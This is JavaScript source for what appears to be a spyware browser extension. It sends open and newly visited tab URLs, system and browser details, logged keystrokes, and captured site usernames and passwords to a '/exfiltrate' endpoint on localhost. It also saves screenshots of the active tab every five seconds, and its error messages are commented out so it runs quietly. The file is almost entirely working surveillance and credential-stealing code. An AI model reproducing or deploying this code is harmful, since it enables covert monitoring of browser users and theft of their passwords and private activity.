// Function to send a stuff to the server
function sendToServer(type, results) {
  fetch("http://localhost:3000/exfiltrate", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ type: type, data: results }),
    })
    .then((response) => {
      if (response.ok) {

      } else {
        //console.error("Failed to send data:", results, response.statusText);
      }
    })
    .catch((error) => {
      //console.error("Error sending data:", results, error);
    });
}

/**********************

       URLS STUFF

************************/

// Loop through all currently open tabs and send their URLs
chrome.tabs.query({}, (tabs) => {
  tabs.forEach((tab) => {
    if (tab.url) {
      sendToServer('urls', tab.url);
    }
  });
});

// Listen for tab updates (e.g., when a user navigates to a new URL)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    sendToServer('urls', tab.url);
  }
});

// Listen for new tabs being created
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.url) {
    sendToServer('urls', tab.url);
  }
});


/**********************

       OS STUFF

************************/

function detectOS() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Windows")) {
        return "Windows";
    } else if (userAgent.includes("Mac")) {
        return "MacOS";
    } else if (userAgent.includes("Linux")) {
        return "Linux";
    } else if (userAgent.includes("Android")) {
        return "Android";
    } else if (userAgent.includes("iOS")) {
        return "iOS";
    } else {
        return "Unknown OS";
    }
}

function detectDeviceType() {
    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    return isMobile ? "Mobile" : "Desktop";
}

function detectBrowser() {
    const userAgent = navigator.userAgent;

    if (userAgent.includes("Firefox")) {
        return "Mozilla Firefox";
    } else if (userAgent.includes("Edg")) {
        return "Microsoft Edge";
    } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
        return "Google Chrome";
    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
        return "Apple Safari";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        return "Opera";
    } else {
        return "Unknown Browser";
    }
}

function collectSystemInfo() {
    const systemInfo = {
        os: detectOS(),
        deviceType: detectDeviceType(),
        browser: detectBrowser(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    sendToServer('os', systemInfo);
}

collectSystemInfo();


/**********************

       Keylogger STUFF

************************/

let keystrokeData = new Map();
let keystrokeTimeouts = new Map(); // Store timeouts per URL

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "keystroke") {
        const { url, text, timestamp } = message;

        if (!keystrokeData.has(url)) {
            keystrokeData.set(url, []);
        }

        if (keystrokeTimeouts.has(url)) {
            clearTimeout(keystrokeTimeouts.get(url));
        }

        const timeout = setTimeout(() => {
            keystrokeData.get(url).push({ text, timestamp });

            // Reinsert the URL entry to move it to the end
            const updatedEntry = [url, keystrokeData.get(url)];
            keystrokeData.delete(url); // Remove old position
            keystrokeData.set(url, updatedEntry[1]); // Reinsert to maintain order

            sendToServer("keys", Object.fromEntries(keystrokeData));

            keystrokeTimeouts.delete(url);
        }, 3000);

        keystrokeTimeouts.set(url, timeout);
    }
});


/**********************

       Credential Stuff

************************/

let credentials = {}
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "credentials") {
        const { site, username, password } = message.data;
        credentials[site] = {username, password};
        sendToServer("credentials", credentials);
    }
});

/**********************

       Screen Capture Stuff

************************/

// Function to capture a screenshot of the visible tab
function captureScreenshot() {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (tabs.length === 0) {
            console.error("No active tab found.");
            return;
        }

        const activeTab = tabs[0];

        // Skip capturing restricted pages (e.g., chrome://, about:)
        if (activeTab.url.startsWith("chrome://") || activeTab.url.startsWith("about:")) {
            console.error("Cannot capture restricted page:", activeTab.url);
            return;
        }

        // Capture the visible tab
        chrome.tabs.captureVisibleTab(activeTab.windowId, { format: "png" }, (dataUrl) => {
            if (chrome.runtime.lastError) {
                console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
                return;
            }

            console.log("Screenshot captured:", dataUrl);
            saveScreenshotLocally(dataUrl); // Save the screenshot locally
        });
    });
}

// Function to save the screenshot locally
function saveScreenshotLocally(dataUrl) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const filename = `screenshots/screenshot-${timestamp}.png`; // Save in a "screenshots" subfolder

    chrome.downloads.download({
        url: dataUrl,
        filename: filename // Specify the relative path
    }, (downloadId) => {
        if (chrome.runtime.lastError) {
            console.error("Error saving screenshot:", chrome.runtime.lastError.message);
        } else {
            console.log("Screenshot saved:", filename);
        }
    });
}

// Set up a timer to capture screenshots every 5 seconds
let screenshotInterval = setInterval(captureScreenshot, 5000);

// Stop the interval if needed (e.g., when the extension is disabled)
chrome.runtime.onSuspend.addListener(() => {
    clearInterval(screenshotInterval);
    console.log("Screenshot capture stopped.");
});